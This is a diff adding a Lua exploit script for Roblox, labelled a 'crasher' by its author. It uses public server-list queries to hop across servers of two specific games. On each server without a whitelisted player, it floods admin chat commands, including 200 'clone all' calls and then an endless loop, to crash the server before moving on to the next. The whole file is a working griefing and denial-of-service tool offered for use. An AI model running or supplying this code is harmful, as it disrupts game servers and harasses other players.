@@ -1,0 +1,123 @@
+--[[
+    GUIDE TO GETTING PLAYERTOKENS
+   
+    Join an empty game and run the code below.
+   
+    setclipboard(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"))
+   
+    Paste the code it copied into Notepad or your favorite text editor and look for a string that looks something like this: "5568CCBED82CD30E127119030810CE98"
+
+    After you copied it, input it into the local variable 'playertoken' below.
+--]]
+
+
+-- crasher made by notoriousknocks on discord
+
+local playertoken = "" -- INPUT YOUR PLAYERTOKEN
+
+repeat task.wait() until game:IsLoaded() == true
+
+function hop()
+    if not ratelimited then
+        local nbc =
+            game:GetService("HttpService"):JSONDecode(
+            game:HttpGet(
+                "https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
+            )
+        )
+        local bc =
+            game:GetService("HttpService"):JSONDecode(
+            game:HttpGet(
+                "https://games.roblox.com/v1/games/115670532/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true"
+            )
+        )
+        if nbc["errors"] or bc["errors"] then
+            print("Request Denied, Retrying In 5 Seconds")
+            task.spawn(function()
+                ratelimited = true
+                task.wait(5)
+                ratelimited = false
+            end)
+            return
+        end
+        print("Checking Servers...")
+        local nbcdata = nbc.data
+        local bcdata = bc.data
+
+        local viable = {}
+
+        for i, v in pairs(nbcdata) do
+            if
+                type(v) == "table" and v.id ~= game.JobId and tonumber(v.playing) < tonumber(v.maxPlayers) and
+                    not table.find(v.playerTokens, playertoken)
+             then
+                table.insert(viable, {["Version"] = "NBC", ["Job"] = v.id})
+            end
+        end
+        for i, v in pairs(bcdata) do
+            if
+                type(v) == "table" and v.id ~= game.JobId and tonumber(v.playing) < tonumber(v.maxPlayers) and
+                    not table.find(v.playerTokens, playertoken)
+             then
+                table.insert(viable, {["Version"] = "BC", ["Job"] = v.id})
+            end
+        end
+        if #viable > 0 then
+            local servertohop = viable[math.random(1, #viable)]
+            if servertohop["Version"] == "NBC" then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, servertohop["Job"])
+            elseif servertohop["Version"] == "BC" then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(115670532, servertohop["Job"])
+            end
+        else
+            print("No Servers...")
+        end
+    end
+end
+
+local whitelisted = {}
+
+for i, v in pairs(game.Players:GetPlayers()) do
+    if not found then
+        if table.find(whitelisted, v.Name) then
+            print("Whitelisted Player Found: " .. v.Name)
+            found = true
+            repeat
+                task.wait()
+                hop()
+            until false
+        end
+    end
+end
+
+if not found then
+    game.Players:Chat("respawn all fuck")
+    for i = 1, 5 do
+        game.Players:Chat("size all .3")
+    end
+    for i = 1, 13 do
+        game.Players:Chat("rocket/all all all fuck")
+        game.Players:Chat("freeze all all all fuck")
+        game.Players:Chat("dog all all all fuck")
+    end
+    for i = 1, 5 do
+        game.Players:Chat("size all 10")
+    end
+    for i = 1, 200 do
+        game.Players:Chat("clone all all all fuck")
+    end
+    print("Crashed Server: "..game.JobId)
+    task.spawn(
+        function()
+            while true do
+                task.wait()
+                game.Players:Chat("clone all all all fuck")
+            end
+        end
+    )
+    task.wait(2)
+    repeat
+        hop()
+        task.wait()
+    until false
+end
